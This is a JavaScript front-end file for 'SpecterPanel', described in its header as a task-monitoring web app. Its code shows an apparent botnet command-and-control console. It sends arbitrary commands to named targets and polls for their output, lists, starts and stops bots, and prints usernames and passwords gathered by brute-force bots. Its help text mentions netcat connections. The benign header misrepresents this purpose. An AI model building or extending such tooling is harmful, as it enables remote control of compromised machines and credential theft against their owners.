/* * SpecterPanel - A Flask-based Web Application
 * This application serves as a web interface for managing and monitoring various tasks.
    * It provides a terminal-like interface for executing commands and interacting with the server.
    * It includes features for polling server updates, handling cookies, and managing API commands.
    *   Example usage:
    *   - The user can enter commands in a terminal-like interface.
    *  - The application polls the server for updates every 3 seconds.
    *  - Commands like 'help', 'clear', 'api-link', 'delete', 'reconnect', and 'get' are supported.
    *  - The application can handle API requests and responses, including JSON data.
    *  - The user can save and retrieve command history using cookies.
    * This file is part of the SpecterPanel project.
 * @file script.js
 * @author SpecterPanel Team
 * @version 1.0
 * @license MIT
 * Copyright (c) 2023 SpecterPanel Team
 * This file is licensed under the MIT License.
 * You may obtain a copy of the License at
 * https://opensource.org/licenses/MIT
 */

// import { PollingClient } from './Ajax_io.js';

const commands = ['help', 'clear', 'bot', 'delete', 'reconnect', 'get', 'reload'];
const url = window.location.pathname.split('/');
const endpoint = '/check_commads_updates/'+url[url.length - 1];  // Last part of path

// Command history array and index
let commandHistory = [];
let historyIndex = -1;
let currentInput = '';

document.getElementById('userInput').addEventListener('keypress', async function (event) {

    if (event.key === 'Enter') {
        let inputText = this.value.trim();
        if (!inputText) return;

        let terminal = document.getElementById('terminal');

        // Show user input
        let newLine = document.createElement('div');
        newLine.classList.add('command-line');
        newLine.innerHTML = `<span class="prompt">user@specter:~$</span> <span class="command-text">${escapeHtml(inputText)}</span>`;
        terminal.insertBefore(newLine, this.parentElement);

        // Placeholder for command output
        let outputLine = document.createElement('div');
        outputLine.classList.add('output-container');
        outputLine.innerHTML = `<div class="output-content"><span class="prompt"></span><pre><code class="output" style="white-space:pre;">Executing command...</code></pre></div>`;
        terminal.insertBefore(outputLine, this.parentElement);

        // Add command to history
        if (inputText) {
            commandHistory.push(inputText);
            if (commandHistory.length > 50) { // Limit history size
                commandHistory.shift();
            }
        }
        historyIndex = -1;
        currentInput = '';
        this.value = '';
        terminal.scrollTop = terminal.scrollHeight;

        let inputCommand = inputText.split(' ')[0];

        if (commands.includes(inputCommand)) {
            try {
                const result = await cmd(inputText);
                outputLine.innerHTML = `<div class="output-content output-success"><span class="prompt"></span><pre><code class="output" style="white-space:pre;">${escapeHtml(result || 'Done')}</code></pre></div>`;
            } catch (e) {
                outputLine.innerHTML = `<div class="output-content output-error"><span class="prompt"></span><pre><code class='output'>Error: ${escapeHtml(e.message)}</code></pre></div>`;
            }
        } else {
            // Send unknown commands to server API
            const data = { input: inputText };
            const response = await api(data, 'POST');
            const msg = (response && response.response) || response?.message || 'Done';
            saveToCookie(`${inputCommand}${response.id}`, inputText,1);

            // Assign ID to the container div
            outputLine.id = response.id;
            outputLine.innerHTML = `<div class="output-content output-success" id="${response.id}"><span class="prompt"></span><pre><code class='output'>${escapeHtml(msg)}<a class="action-btn btn-delete delelet_btns" onclick="delete_cmd('${response.id}','${response.target_name}')">Delete</a></code></pre></div>`;
        }

        terminal.scrollTop = terminal.scrollHeight;
    }
});

// Add arrow key navigation for command history
document.getElementById('userInput').addEventListener('keydown', function (event) {
    if (event.key === 'ArrowUp') {
        event.preventDefault();
        navigateHistory(1);
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        navigateHistory(-1);
    }
});

// Command history navigation function
function navigateHistory(direction) {
    if (commandHistory.length === 0) return;

    // Save current input when starting navigation
    if (historyIndex === -1) {
        currentInput = document.getElementById('userInput').value;
    }

    historyIndex += direction;

    // Handle boundaries
    if (historyIndex < -1) {
        historyIndex = -1;
    } else if (historyIndex >= commandHistory.length) {
        historyIndex = commandHistory.length - 1;
    }

    // Update input field
    if (historyIndex === -1) {
        document.getElementById('userInput').value = currentInput;
    } else {
        document.getElementById('userInput').value = commandHistory[commandHistory.length - 1 - historyIndex];
    }
}

function saveToCookie(name, value, days = 365) {
    const date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    const expires = "expires=" + date.toUTCString();
    document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
}

function getCookie(name) {
    const key = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i].trim();
        if (c.indexOf(key) === 0) return decodeURIComponent(c.substring(key.length));
    }
    console.warn(`Cookie with name "${name}" not found.`);
    return null;
}

async function cmd(userInput) {
    const input = userInput.trim().split(' ').filter(Boolean);
    console.log('Parsed Input:', input);

    if (!input.length) {
        return 'Please enter a command. Type "help" for available commands.';
    }

    const command = input[0].toLowerCase();

    if (command === "bot") {
        // bot command logic
        if (input.length === 1 || input[1] === '--help' || input[1] === 'help') {
            return `bot [command] [options]
Commands:
    show               : Show all bots.
    start --id <id>    : Start a bot by ID.
    stop --id <id>     : Stop a bot by ID.
Options:
    --help             : Show this help message.`;
        }

        if (input[1] === 'show') {
try {
    const targetId = url[url.length - 1];
    if (!targetId || targetId === 'undefined') {
        return 'Error: No valid target ID found in URL.';
    }

    const data = await api(null, 'GET', `/api_command/botNet/${targetId}`);
    if (!data) return 'Error: No response received from server.';

    const botList = data.botNetInfo || data;
    if (!Array.isArray(botList) || botList.length === 0) {
        return 'No bot data available.';
    }

    let output = "======================Available Bots==========================\n\n";

    botList.forEach((bot, i) => {
        // handle array or object format
        const b = Array.isArray(bot) ? bot : Object.values(bot);

        const id = b[0] || 'N/A';
        const type = b[4] || 'unknown';
        const status = b[5] || 'unknown';
        const threads = b[7] || '0';
        const username = b[8] || '';
        const password = b[9] || '';

        output += `Bot #${i + 1}\n`;
        output += `ID       = ${id}\n`;
        output += `Type     = ${type}\n`;
        output += `Status   = ${status}\n`;
        output += `Threads  = ${threads}\n`;

        if (type === 'bruteForce') {
            output += `Username = ${username}\n`;
            output += `Password = ${password}\n`;
        }

        output += "--------------------------------------------------------------\n";
    });

    output += "==============================================================\n";
    return output;

} catch (error) {
    console.error('Error fetching bot data:', error);
    return `Failed to fetch bot data: ${error.message}`;
}

        } else if ((input[1] === 'start' || input[1] === 'stop') && (input[2] === '--id' || input[2] === '-i') && input[3]) {
            try {
                const data = { input: userInput };
                const response = await api(data, 'POST', `/api_command/${url[url.length - 1]}`);
                const msg = response?.response || response?.message || 'Command executed successfully';
                return msg;
            } catch (error) {
                console.error(`Error executing bot ${input[1]} command:`, error);
                return `Error executing command: ${error.message}`;
            }
        } else {
            return `Invalid bot command: "${input[1]}". Use 'bot --help' for usage.`;
        }

    } else if (command === 'get') {
        try {
            const data = await api(null, 'GET', '/api_command/api');
            return JSON.stringify(data, null, 2);
        } catch (error) {
            return `Error fetching API data: ${error.message}`;
        }
    } else if (command === 'reload') {
        setTimeout(() => {
            window.location.reload();
        }, 100);
        return 'Reloading page...';
    } else if (command === 'delete') {
        const btns = document.getElementsByClassName('btn-delete');
        for (let i = 0; i < btns.length; i++) {
            btns[i].style.display = 'none';
        }
        return 'Delete buttons hidden.';
    } else if (command === 'clear') {
        const terminal = document.getElementById('terminal');
        if (terminal) {
            const lines = terminal.querySelectorAll('.command-line, .output-container');
            lines.forEach(line => {
                if (!line.querySelector('input')) {
                    line.remove();
                }
            });
        }
        return '';
    } else {
        return help_cmd(input);
    }
}


async function delete_cmd(ID,target_name){
    data = {
        'id': ID,
        'target_name': target_name
    };
    const r = await api(data,'DELETE');
    const msg = (r && r.response) || r?.message || 'Done';
    return msg
}


// Function to handle API requests
// This function can be used to send data to the server and receive a response.
async function api(data=NaN, method='GET', url = window.location.href, parm = '') {
    /*    * data: The data to be sent to the server (optional).
     *    * method: The HTTP method to use (e.g., 'GET', 'POST').
     *    * url: The URL to send the request to (default is the current page URL).
     *    * parm: Additional parameters to append to the URL (optional).
     *    * Returns: The JSON response from the server.
     * *    * Example usage:
     *    * const response = await api({ key: 'value' }, 'POST', '/api/endpoint');
     *    * console.log(response);
     * *    * Note: This function uses the Fetch API to make HTTP requests.
     * *    * It handles errors and returns the JSON response.
     */
    try {
        let options = {
            method: method.toUpperCase(),
            headers: { 'Content-Type': 'application/json' },
        };

        if (method.toLowerCase() !== 'get' && data) {
            options.body = JSON.stringify(data);
        }

        if (url.endsWith('/')) url = url.slice(0, -1);
        if (parm && typeof parm === 'string') {
            url += parm.startsWith('/') ? parm : '/' + parm;
        }

        const response = await fetch(url, options);
        return await response.json();
    } catch (error) {

        console.error('URL:', url, 'Method:', method, 'Data:', data);
        return null;
    }
}
// chake for update
/*
data recived from api_command_update
{
    "message": "update"
}
*/
setInterval(async () => {
    // Get the last part of the URL, safely encode it
    let target_name = window.location.href.split('/').pop();
    target_name = encodeURIComponent(target_name);

    const updateURL = `/check_command_update/${target_name}`;

    try {
        console.log('Polling:', updateURL);
        const response = await api(null, 'GET', updateURL);

        // Ensure expected structure
        if (response && response.message === 'Commands checked successfully') {
            const list_of_cmd = response.updated_commands || [];

            console.log('Received commands:', response);

            for (let i = 0; i < list_of_cmd.length; i++) {
                const cmdTuple = list_of_cmd[i];

                // Make sure it's an array with 2 elements: [output, id]
                if (!Array.isArray(cmdTuple) || cmdTuple.length < 2) continue;

                const [output, cmdId] = cmdTuple;

                if (!cmdId) continue;

                const divElement = document.getElementById(cmdId);
                if (!divElement) {
                    console.warn(`Element for command ID '${cmdId}' not found.`);
                    continue;
                }

                const outputSpan = divElement.querySelector('.output');
                if (outputSpan) {
                    outputSpan.innerText = `${escapeHtml(output || 'No output')}`;
                    outputSpan.scrollTop = outputSpan.scrollHeight;
                }
            }

        } else if (response?.message === 'No commands to check for updates') {
            console.log('No updates found');
        } else {
            console.warn('Unexpected response:', response);
        }
    } catch (err) {
        console.error('Polling failed:', err);
    }
}, 5000); // every 5000 milliseconds or 5 seconds



function help_cmd(inputText) {
    if (inputText[0] === 'help') {
        return `This is help message
-----------------------
Commands                 Use
------------------------------------------------
help                   : Show this help message.
clear                  : Clear the screen.
api-link               : List all available API links.
delete                 : Used to edit commands (delete).
reconnect              : Used to reconnect or change connection method (e.g. API or netcat).`;
    } else if (inputText[0] === 'api-link' && inputText[1] === 'help') {
        return `${inputText[0]} [command [option]]

Commands
    [*] help
    [*] update
    [*] delete
update [-i,--id], [-l,--link]
update [-i,--id], [-a,--action]
delete [-i,--id]

Note: You can use the web UI to update or delete.
When using 'update', use at least [-i,--id].`;
    }
}

function escapeHtml(unsafe) {
    if (unsafe == null) {
        return '';
    }
    
    // Convert to string if it's not already
    const safeString = String(unsafe);
    
    return safeString
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}